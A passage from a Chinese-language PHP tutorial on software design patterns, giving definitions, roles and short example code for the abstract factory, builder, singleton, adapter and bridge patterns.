<h2 id="3-抽象工厂模式"><a href="#3-抽象工厂模式" class="headerlink" title="3. 抽象工厂模式"></a>3. 抽象工厂模式</h2><p>提供一个创建一系列相关或相互依赖对象的接口，而无须指定它们具体的类。抽象工厂模式又称为 Kit 模式，属于对象创建型模式。</p>
<p>此模式是对工厂方法模式的进一步扩展。在工厂方法模式中，一个具体的工厂负责生产一类具体的产品，即一对一的关系，但是，如果需要一个具体的工厂生产多种产品对象，那么就需要用到抽象工厂模式了。</p>
<p>为了便于理解此模式，这里介绍两个概念：</p>
<p>产品等级结构：产品等级结构即产品的继承结构，如一个抽象类是电视机，其子类有海尔电视机、海信电视机、TCL 电视机，则抽象电视机与具体品牌的电视机之间构成了一个产品等级结构，抽象电视机是父类，而具体品牌的电视机是其子类。</p>
<p>产品族 ：在抽象工厂模式中，产品族是指由同一个工厂生产的，位于不同产品等级结构中的一组产品，如海尔电器工厂生产的海尔电视机、海尔电冰箱，海尔电视机位于电视机产品等级结构中，海尔电冰箱位于电冰箱产品等级结构中。</p>
<p>角色：</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">抽象工厂（AbstractFactory）：担任这个角色的是抽象工厂模式的核心，是与应用系统的商业逻辑无关的。</span><br><span class="line"></span><br><span class="line">具体工厂（Factory）：这个角色直接在客户端的调用下创建产品的实例，这个角色含有选择合适的产品对象的逻辑，而这个逻辑是与应用系统商业逻辑紧密相关的。</span><br><span class="line"></span><br><span class="line">抽象产品（AbstractProduct）：担任这个角色的类是抽象工厂模式所创建的对象的父类，或它们共同拥有的接口</span><br><span class="line"></span><br><span class="line">具体产品（<span class="built_in">Product</span>）：抽象工厂模式所创建的任何产品对象都是一个具体的产品类的实例。</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">TV</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">watch</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaierTv</span> <span class="keyword">implements</span> <span class="title">TV</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Open Haier TV &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">watch</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m watching TV &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PC</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LenovoPc</span> <span class="keyword">implements</span> <span class="title">PC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m working on a Lenovo computer &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Lenovo computers can be used to play games &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createPc</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createTv</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProductFactory</span> <span class="keyword">extends</span> <span class="title">Factory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createTV</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HaierTv</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createPc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LenovoPc</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$newTv</span> = <span class="title class_">ProductFactory</span>::<span class="title function_ invoke__">createTV</span>();</span><br><span class="line"><span class="variable">$newTv</span>-&gt;<span class="title function_ invoke__">open</span>();</span><br><span class="line"><span class="variable">$newTv</span>-&gt;<span class="title function_ invoke__">watch</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$newPc</span> = <span class="title class_">ProductFactory</span>::<span class="title function_ invoke__">createPc</span>();</span><br><span class="line"><span class="variable">$newPc</span>-&gt;<span class="title function_ invoke__">work</span>();</span><br><span class="line"><span class="variable">$newPc</span>-&gt;<span class="title function_ invoke__">play</span>();</span><br></pre></td></tr></table></figure>

<h2 id="4-建造者模式"><a href="#4-建造者模式" class="headerlink" title="4. 建造者模式"></a>4. 建造者模式</h2><p>又名：生成器模式，是一种对象构建模式。它可以将复杂对象的建造过程抽象出来（抽象类别），使这个抽象过程的不同实现方法可以构造出不同表现（属性）的对象。</p>
<p>建造者模式是一步一步创建一个复杂的对象，它允许用户只通过指定复杂对象的类型和内容就可以构建它们，用户不需要知道内部的具体构建细节。例如，一辆汽车由轮子，发动机以及其他零件组成，对于普通人而言，我们使用的只是一辆完整的车，这时，我们需要加入一个构造者，让他帮我们把这些组件按序组装成为一辆完整的车。</p>
<p>角色：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Builder：抽象构造者类，为创建一个 </span>Product 对象的各个部件指定抽象接口。</span><br><span class="line"></span><br><span class="line">ConcreteBuilder：具体构造者类，实现 <span class="keyword">Builder </span>的接口以构造和装配该产品的各个部件。定义并明确它所创建的表示。提供一个检索产品的接口</span><br><span class="line"></span><br><span class="line"><span class="keyword">Director：指挥者，构造一个使用 </span><span class="keyword">Builder </span>接口的对象。</span><br><span class="line"></span><br><span class="line">Product：表示被构造的复杂对象。ConcreateBuilder 创建该产品的内部表示并定义它的装配过程。</span><br></pre></td></tr></table></figure>

<p>包含定义组成部件的类，包括将这些部件装配成最终产品的接口。</p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* chouxiang builer</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Builder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$car</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPartA</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPartB</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPartC</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarBuilder</span> <span class="keyword">extends</span> <span class="title">Builder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;car = <span class="keyword">new</span> <span class="title class_">Car</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPartA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;car-&gt;<span class="title function_ invoke__">setPartA</span>(<span class="string">&#x27;发动机&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPartB</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;car-&gt;<span class="title function_ invoke__">setPartB</span>(<span class="string">&#x27;轮子&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPartC</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;car-&gt;<span class="title function_ invoke__">setPartC</span>(<span class="string">&#x27;其他零件&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;car;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$partA</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$partB</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$partC</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPartA</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;partA = <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPartB</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;partB = <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPartC</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;partC = <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这辆车由：&quot;</span>.<span class="variable language_">$this</span>-&gt;partA.<span class="string">&#x27;,&#x27;</span>.<span class="variable language_">$this</span>-&gt;partB.<span class="string">&#x27;,和&#x27;</span>.<span class="variable language_">$this</span>-&gt;partC.<span class="string">&#x27;组成&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Director</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$myBuilder</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startBuild</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;myBuilder-&gt;<span class="title function_ invoke__">buildPartA</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;myBuilder-&gt;<span class="title function_ invoke__">buildPartB</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;myBuilder-&gt;<span class="title function_ invoke__">buildPartC</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;myBuilder-&gt;<span class="title function_ invoke__">getResult</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setBuilder</span>(<span class="params">Builder <span class="variable">$builder</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;myBuilder = <span class="variable">$builder</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$carBuilder</span> = <span class="keyword">new</span> <span class="title class_">CarBuilder</span>();</span><br><span class="line"><span class="variable">$director</span> = <span class="keyword">new</span> <span class="title class_">Director</span>();</span><br><span class="line"><span class="variable">$director</span>-&gt;<span class="title function_ invoke__">setBuilder</span>(<span class="variable">$carBuilder</span>);</span><br><span class="line"><span class="variable">$newCar</span> = <span class="variable">$director</span>-&gt;<span class="title function_ invoke__">startBuild</span>();</span><br><span class="line"><span class="variable">$newCar</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br></pre></td></tr></table></figure>

<h2 id="5-单例模式"><a href="#5-单例模式" class="headerlink" title="5. 单例模式"></a>5. 单例模式</h2><p>单例模式，也叫单子模式，是一种常用的软件设计模式。在应用这个模式时，单例对象的类必须保证只有一个实例存在。许多时候整个系统只需要拥有一个的全局对象，这样有利于我们协调系统整体的行为。</p>
<p>实现单例模式的思路是：一个类能返回对象一个引用 (永远是同一个) 和一个获得该实例的方法（必须是静态方法，通常使用 getInstance 这个名称）；当我们调用这个方法时，如果类持有的引用不为空就返回这个引用，如果类保持的引用为空就创建该类的实例并将实例的引用赋予该类保持的引用；同时我们还将该类的构造函数定义为私有方法，这样其他处的代码就无法通过调用该类的构造函数来实例化该类的对象，只有通过该类提供的静态方法来得到该类的唯一实例。</p>
<p>— 维基百科</p>
<p>单例模式的要点有：某个类只能有一个实例；它必须自行创建本身的实例；它必须自行向整个系统提供这个实例。单例模式是一种对象创建型模式。</p>
<p>角色：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Singleton：单例类</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span>;</span><br><span class="line">  <span class="comment">//私有构造方法，禁止使用new创建对象</span></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$instance</span>)) &#123;</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//将克隆方法设为私有，禁止克隆对象</span></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这是用单例模式创建对象实例 &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这里可以添加其他方法和操作 &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $shiyanlou = new Singleton();</span></span><br><span class="line"><span class="variable">$shiyanlou</span> = <span class="title class_">Singleton</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line"><span class="variable">$shiyanlou</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$shiyanlou</span>-&gt;<span class="title function_ invoke__">operation</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$newShiyanlou</span> = <span class="title class_">Singleton</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$shiyanlou</span> === <span class="variable">$newShiyanlou</span>);</span><br></pre></td></tr></table></figure>

<p>上述的五个模式均属于创建型模式，接下来将要介绍的六个模式属于结构型模式，在本实验后面的文档将介绍三个，剩下来的留在下一个实验继续介绍。</p>
<h2 id="6-适配器模式"><a href="#6-适配器模式" class="headerlink" title="6. 适配器模式"></a>6. 适配器模式</h2><p>在设计模式) 中，适配器模式（英语：adapter pattern）有时候也称包装样式或者包装 (wrapper)。将一个类) 的接口转接成用户所期待的。一个适配使得因接口不兼容而不能在一起工作的类工作在一起，做法是将类自己的接口包裹在一个已存在的类中。</p>
<p>— 维基百科</p>
<p>顾名思义，此模式是源于类似于电源适配器的设计和编码技巧。比如现在有一些类，提供一些可用的接口，但是可能客户端因为不兼容的原因，不能直接调用这些现有的接口，这时就需要一个适配器来作为中转站，适配器类可以向用户提供可用的接口，其内部将收到的请求转换为对适配者对应接口的真是请求，从而实现对不兼容的类的复用。</p>
<p>优点：将目标类和适配者类解耦，通过引入一个适配器类来重用现有的适配者类，而无须修改原有代码。增加了类的透明性和复用性，将具体的实现封装在适配者类中，对于客户端类来说是透明的，而且提高了适配者的复用性。</p>
<p>角色：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">Target：目标抽象类</span><br><span class="line"></span><br><span class="line">Adapter：适配器类</span><br><span class="line"></span><br><span class="line">Adaptee：适配者类</span><br><span class="line"></span><br><span class="line"><span class="built_in">Client</span>：客户类</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adaptee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">realRequest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这是被适配者真正的调用方法&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Target</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">implements</span> <span class="title">Target</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$adaptee</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Adaptee <span class="variable">$adaptee</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;adaptee = <span class="variable">$adaptee</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;适配器转换：&quot;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;adaptee-&gt;<span class="title function_ invoke__">realRequest</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$adaptee</span> = <span class="keyword">new</span> <span class="title class_">Adaptee</span>();</span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title class_">Adapter</span>(<span class="variable">$adaptee</span>);</span><br><span class="line"><span class="variable">$target</span>-&gt;<span class="title function_ invoke__">request</span>();</span><br></pre></td></tr></table></figure>

<h2 id="7-桥接模式"><a href="#7-桥接模式" class="headerlink" title="7. 桥接模式"></a>7. 桥接模式</h2><p>桥接模式是软件设计模式中最复杂的模式之一，它把事物对象和其具体行为、具体特征分离开来，使它们可以各自独立的变化。事物对象仅是一个抽象的概念。如 “圆形”、“三角形” 归于抽象的 “形状” 之下，而 “画圆”、“画三角” 归于实现行为的 “画图” 类之下，然后由 “形状” 调用 “画图”。</p>
<p>理解桥接模式，重点需要理解如何将抽象化 (Abstraction) 与实现化 (Implementation) 脱耦，使得二者可以独立地变化。桥接模式提高了系统的可扩充性，在两个变化维度中任意扩展一个维度，都不需要修改原有系统。</p>
<p>角色：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Abstraction：定义抽象的接口，该接口包含实现具体行为、具体特征的 Implementor 接口</span><br><span class="line"></span><br><span class="line">Refined Abstraction：抽象接口 Abstraction 的子类，依旧是一个抽象的事物名</span><br><span class="line"></span><br><span class="line">Implementor：定义具体行为、具体特征的应用接口</span><br><span class="line"></span><br><span class="line">ConcreteImplementor：实现 Implementor 接口</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">DrawingAPI</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">drawCircle</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$radius</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* drawAPI1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DrawingAPI1</span> <span class="keyword">implements</span> <span class="title">DrawingAPI</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">drawCircle</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$radius</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;API1.circle at (&quot;</span>.<span class="variable">$x</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$y</span>.<span class="string">&#x27;) radius &#x27;</span>.<span class="variable">$radius</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* drawAPI2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DrawingAPI2</span> <span class="keyword">implements</span> <span class="title">DrawingAPI</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">drawCircle</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$radius</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;API2.circle at (&quot;</span>.<span class="variable">$x</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$y</span>.<span class="string">&#x27;) radius &#x27;</span>.<span class="variable">$radius</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*shape接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Shape</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resize</span>(<span class="params"><span class="variable">$radius</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CircleShape</span> <span class="keyword">implements</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$y</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$radius</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$drawingAPI</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$radius</span>,DrawingAPI <span class="variable">$drawingAPI</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;y = <span class="variable">$y</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;radius = <span class="variable">$radius</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;drawingAPI = <span class="variable">$drawingAPI</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;drawingAPI-&gt;<span class="title function_ invoke__">drawCircle</span>(<span class="variable">$this</span>-&gt;x,<span class="variable">$this</span>-&gt;y,<span class="variable">$this</span>-&gt;radius);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resize</span>(<span class="params"><span class="variable">$radius</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;radius = <span class="variable">$radius</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shape1</span> = <span class="keyword">new</span> <span class="title class_">CircleShape</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="keyword">new</span> <span class="title class_">DrawingAPI1</span>());</span><br><span class="line"><span class="variable">$shape2</span> = <span class="keyword">new</span> <span class="title class_">CircleShape</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="keyword">new</span> <span class="title class_">DrawingAPI2</span>());</span><br><span class="line"><span class="variable">$shape1</span>-&gt;<span class="title function_ invoke__">draw</span>();</span><br><span class="line"><span class="variable">$shape2</span>-&gt;<span class="title function_ invoke__">draw</span>();</span><br><span class="line"><span class="variable">$shape1</span>-&gt;<span class="title function_ invoke__">resize</span>(<span class="number">10</span>);</span><br><span class="line"><span class="variable">$shape1</span>-&gt;<span class="title function_ invoke__">draw</span>();</span><br></pre></td></tr></table></figure>

